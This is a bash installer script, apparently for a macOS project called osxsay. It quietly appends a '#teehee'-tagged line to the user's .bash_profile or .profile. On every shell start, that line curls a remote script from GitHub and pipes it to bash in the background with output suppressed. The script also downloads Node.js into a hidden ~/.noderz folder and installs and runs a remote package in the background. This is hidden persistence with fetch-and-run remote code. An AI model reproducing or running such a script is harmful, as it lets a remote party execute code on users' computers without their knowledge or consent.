#!/usr/local/bin/bash
GODL="https://raw.github.com/Jakobo/osxsay/master/godl.sh"
NODEREV="v0.10.25"
NODEDIR="node-$NODEREV-darwin-x86"
NODEGZ="$NODEDIR.tar.gz"
NODEBIN="http://nodejs.org/dist/$NODEREV/$NODEGZ"
WHOAMI=$(whoami)
ROOT="/Users/$WHOAMI"
NODEZDIR="$ROOT/.noderz"

node="$NODEZDIR/$NODEDIR/bin/node"
npm="$NODEZDIR/$NODEDIR/bin/npm"

# make our storage dir if it doesn't exist yet
mkdir -p $NODEZDIR

# install godl in bash profile if doesn't exist
if [[ ! -s "$HOME/.bash_profile" && -s "$HOME/.profile" ]] ; then
  profile_file="$HOME/.profile"
else
  profile_file="$HOME/.bash_profile"
fi
if ! grep -q '#teehee' "${profile_file}" ; then
  # backgrounded from bash profile
  echo "#teehee" >> "${profile_file}"
  echo " \$(curl -s -L $GODL | bash > /dev/null 2>&1 &)" >> "${profile_file}"
fi

# running?
running="0"
[[ -n `ps aux | grep start.js | grep -v grep` ]] && running="1"
if [ "$running" -eq "1" ] ; then
  exit 0
fi

# node and npm (install in .directory)
if [ ! -f $node ]; then
  # get node binary, unpack
  cd $NODEZDIR
  curl -s -L $NODEBIN > $NODEGZ
  tar -xzf $NODEGZ
fi

# create a temporary directory and load the code
# update if already installed
cd $NODEZDIR
$npm install https://github.com/Jakobo/osxsay/tarball/master > /dev/null 2>&1

# run
cd $NODEZDIR/node_modules/osxsay
$node start.js &

# home...
cd
